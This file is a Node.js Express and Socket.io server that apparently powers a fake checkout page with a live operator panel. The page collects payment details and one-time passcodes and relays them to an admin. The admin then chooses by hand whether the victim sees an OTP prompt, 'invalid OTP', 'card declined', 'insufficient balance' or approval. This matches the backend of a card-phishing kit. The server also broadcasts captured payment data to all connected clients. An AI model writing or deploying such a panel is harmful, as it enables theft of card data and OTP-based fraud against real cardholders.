import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { fileURLToPath } from 'url';
import pathToRegexp from 'path-to-regexp';
import { match } from 'path-to-regexp';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = createServer(app);

// Configure CORS for Socket.io based on environment
const corsOptions = {
  origin: process.env.NODE_ENV === 'production' 
    ? true // Allow all origins in production (Render.com handles HTTPS)
    : [
        "http://localhost:5173",
        "http://localhost:3000",
        "http://localhost:8080",
        "http://localhost:8081"
      ],
  methods: ["GET", "POST"],
  credentials: true
};

const io = new Server(server, {
  cors: corsOptions,
  transports: ['websocket', 'polling']
});

// Serve static files from the dist directory in production
if (process.env.NODE_ENV === 'production') {
  app.use(express.static(path.join(__dirname, 'dist')));
  // Handle React routing - serve index.html for all non-API routes
  app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
  });
}

// Store active visitors (key: socket.id, value: visitorData)
const activeVisitors = new Map();

// Store successful payments (key: hash, value: paymentData)
const successfulPayments = new Map();

// Persistent storage for admin data (visitors NOT stored - only active tracking)
const adminData = {
  payments: [],
  otps: [],
  globalCurrency: 'INR' // Default currency
};

// Store current exchange rate (USD to INR)
let currentExchangeRate = 83.0; // Default rate, will be updated by API

// Load existing admin data from file/storage
function loadAdminData() {
  try {
    // In production, this could be a database. For now, using memory with backup
    console.log('Admin data initialized');
  } catch (error) {
    console.error('Error loading admin data:', error);
  }
}

// Save admin data (could be to file or database)
function saveAdminData() {
  try {
    // Data is kept in memory and sent to clients
    console.log(`Admin data saved: ${adminData.payments.length} payments, ${adminData.otps.length} otps, ${activeVisitors.size} active visitors`);
  } catch (error) {
    console.error('Error saving admin data:', error);
  }
}

// Initialize admin data
loadAdminData();

// Add JSON middleware for API endpoints
app.use(express.json());

// Add CORS middleware for cross-origin requests
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  
  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
});

// Clean up inactive visitors periodically (15 min timeout - generous for checkout)
setInterval(() => {
  const now = new Date();
  const timeout = 15 * 60 * 1000; // 15 minutes (very generous)
  let cleanedCount = 0;
  
  activeVisitors.forEach((visitor, socketId) => {
    const lastActivity = new Date(visitor.lastActivity);
    if (now - lastActivity > timeout) {
      console.log(`🧹 Cleaning inactive visitor: ${visitor.visitorId} (last activity: ${visitor.lastActivity})`);
      io.emit('visitor-left', { visitorId: visitor.visitorId });
      activeVisitors.delete(socketId);
      cleanedCount++;
    }
  });
  
  if (cleanedCount > 0) {
    console.log(`🧹 Cleaned ${cleanedCount} inactive visitors. Active: ${activeVisitors.size}`);
  }
}, 60000); // Check every minute

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log('User connected:', socket.id);

  // Handle payment data from checkout page
  socket.on('payment-data', (data) => {
    console.log('Payment data received:', data);
    
    // Add to persistent storage
    const paymentWithId = {
      ...data,
      id: data.paymentId || `payment_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      status: 'pending',
      timestamp: data.timestamp || new Date().toISOString()
    };
    
    adminData.payments.push(paymentWithId);
    saveAdminData();
    
    // Emit to ALL clients (including admin panels)
    io.emit('payment-received', paymentWithId);
  });

  // Handle visitor tracking with enhanced heartbeat mechanism
  socket.on('visitor-joined', (data) => {
    console.log('Visitor joined:', data);
    
    // Store visitor data with socket ID for tracking
    socket.visitorData = {
      ...data,
      id: data.visitorId || `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      socketId: socket.id,
      lastActivity: new Date().toISOString(),
      timestamp: new Date().toISOString()
    };
    
    activeVisitors.set(socket.id, socket.visitorData);
    
    // Do NOT store visitors persistently - only track while active
    // Only emit to admin panels for real-time tracking
    io.emit('visitor-joined', socket.visitorData);
  });

  socket.on('visitor-heartbeat', (data) => {
    // Update visitor activity timestamp
    if (socket.visitorData) {
      const now = new Date().toISOString();
      socket.visitorData.lastActivity = now;
      socket.visitorData.timestamp = now;
      activeVisitors.set(socket.id, socket.visitorData);
      
      console.log(`💓 Heartbeat received from visitor: ${socket.visitorData.visitorId}`);
      
      // Emit to all clients to keep admin panel in sync
      io.emit('visitor-heartbeat-update', socket.visitorData);
    } else {
      console.warn('⚠️ Received heartbeat but no visitor data found');
    }
  });

  socket.on('visitor-left', (data) => {
    console.log('Visitor left:', data);
    // Remove from active visitors
    if (socket.visitorData) {
      activeVisitors.delete(socket.id);
      io.emit('visitor-left', { visitorId: socket.visitorData.visitorId });
      socket.visitorData = null;
    }
  });

  // Handle admin actions
  socket.on('show-otp', (data) => {
    console.log('Admin requested OTP:', data);
    socket.broadcast.emit('show-otp', data);
  });

  socket.on('payment-approved', (data) => {
    console.log('Admin approved payment:', data);
    console.log('Broadcasting payment-approved to all clients');
    socket.broadcast.emit('payment-approved', data);
  });

  socket.on('reject-payment', (data) => {
    console.log('Admin rejected payment:', data);
    socket.broadcast.emit('payment-rejected', data);
  });

  // New admin actions for enhanced OTP flow
  socket.on('invalid-otp-error', (data) => {
    console.log('Admin marked OTP as invalid', data);
    socket.broadcast.emit('invalid-otp-error', data);
  });

  socket.on('card-declined-error', (data) => {
    console.log('Admin declined card', data);
    socket.broadcast.emit('card-declined-error', data);
  });

  socket.on('insufficient-balance-error', (data) => {
    console.log('Admin marked insufficient balance', data);
    socket.broadcast.emit('insufficient-balance-error', data);
  });

  // Handle OTP submission
  socket.on('otp-submitted', (data) => {
    console.log('OTP submitted:', data);
    
    // Add to persistent storage
    const otpData = {
      ...data,
      id: `otp_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      timestamp: new Date().toISOString()
    };
    
    adminData.otps.push(otpData);
    saveAdminData();
    
    socket.broadcast.emit('otp-submitted', otpData);
  });

  // Handle admin panel connection - send historical data
  socket.on('admin-connected', () => {
    console.log('Admin panel connected, performing aggressive cleanup');
    
    // NUCLEAR OPTION: Clear ALL visitors and start fresh
    const oldCount = activeVisitors.size;
    activeVisitors.clear();
    console.log(`🔥 NUCLEAR CLEANUP: Cleared ${oldCount} visitors completely`);
    
    // Send completely fresh data (no visitors)
    socket.emit('admin-historical-data', {
      payments: adminData.payments,
      visitors: [], // Always empty on admin connect
      otps: adminData.otps,
      activeVisitors: []
    });
    
    console.log('✅ Admin connected with completely fresh visitor data');
  });

  // Handle admin request to reset all visitor tracking (nuclear option)
  socket.on('admin-reset-visitors', () => {
    console.log('🔥 Admin requested complete visitor reset');
    activeVisitors.clear();
    io.emit('visitors-reset');
    console.log('✅ All visitor tracking reset');
  });

  // Handle admin currency change
  socket.on('admin-currency-change', (data) => {
    console.log('💱 Admin changed global currency:', data);
    adminData.globalCurrency = data.currency;
    
    // Broadcast currency change to all connected clients (checkout pages)
    io.emit('global-currency-change', {
      currency: data.currency,
      exchangeRate: currentExchangeRate
    });
    
    console.log(`✅ Global currency updated to ${data.currency}`);
    saveAdminData();
  });

  // Handle request for current currency settings
  socket.on('get-currency-settings', () => {
    socket.emit('currency-settings', {
      currency: adminData.globalCurrency,
      exchangeRate: currentExchangeRate
    });
  });

  socket.on('disconnect', () => {
    console.log('User disconnected:', socket.id);
    // If visitor was tracked, remove from activeVisitors and emit visitor left event
    if (socket.visitorData) {
      io.emit('visitor-left', { visitorId: socket.visitorData.visitorId });
      activeVisitors.delete(socket.id);
      socket.visitorData = null;
    }
  });
});

// API endpoint to store successful payment data
app.post('/api/success-payment', (req, res) => {
  console.log('📤 POST /api/success-payment called with body:', req.body);
  try {
    const { hash, paymentData } = req.body;
    if (!hash || !paymentData) {
      console.log('❌ Missing hash or paymentData');
      return res.status(400).json({ error: 'Hash and payment data are required' });
    }
    
    // Store the payment data with the hash as key
    const dataToStore = {
      ...paymentData,
      storedAt: new Date().toISOString()
    };
    successfulPayments.set(hash, dataToStore);
    
    console.log('✅ Stored successful payment with hash:', hash);
    console.log('Total stored payments:', successfulPayments.size);
    res.json({ success: true, hash });
  } catch (error) {
    console.error('Error storing successful payment:', error);
    res.status(500).json({ error: 'Failed to store payment data' });
  }
});

// API endpoint to retrieve successful payment data
app.get('/api/success-payment/:hash', (req, res) => {
  const { hash } = req.params;
  console.log('📥 GET /api/success-payment/:hash called with hash:', hash);
  console.log('Total stored payments:', successfulPayments.size);
  console.log('Available hashes:', Array.from(successfulPayments.keys()));
  
  try {
    const paymentData = successfulPayments.get(hash);
    
    if (!paymentData) {
      console.log('❌ Payment not found for hash:', hash);
      return res.status(404).json({ error: 'Payment not found' });
    }
    
    console.log('📖 Retrieved successful payment with hash:', hash);
    res.json({ success: true, paymentData });
  } catch (error) {
    console.error('Error retrieving successful payment:', error);
    res.status(500).json({ error: 'Failed to retrieve payment data' });
  }
});

// API endpoint to get current currency settings
app.get('/api/currency-settings', (req, res) => {
  console.log('💱 GET /api/currency-settings called');
  res.json({
    success: true,
    currency: adminData.globalCurrency,
    exchangeRate: currentExchangeRate
  });
});

// API endpoint to update exchange rate (could be called by external service)
app.post('/api/update-exchange-rate', (req, res) => {
  console.log('💱 POST /api/update-exchange-rate called with body:', req.body);
  try {
    const { rate } = req.body;
    if (!rate || rate <= 0) {
      return res.status(400).json({ error: 'Valid exchange rate is required' });
    }
    
    currentExchangeRate = parseFloat(rate);
    
    // Broadcast updated rate to all connected clients
    io.emit('exchange-rate-update', {
      currency: adminData.globalCurrency,
      exchangeRate: currentExchangeRate
    });
    
    console.log(`✅ Exchange rate updated to: ${currentExchangeRate}`);
    res.json({ success: true, exchangeRate: currentExchangeRate });
  } catch (error) {
    console.error('Error updating exchange rate:', error);
    res.status(500).json({ error: 'Failed to update exchange rate' });
  }
});

// Health check endpoint for Render.com
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 3001;

// Error handling for server startup
server.on('error', (error) => {
  console.error('Server error:', error);
  process.exit(1);
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log('Node.js version:', process.version);
});
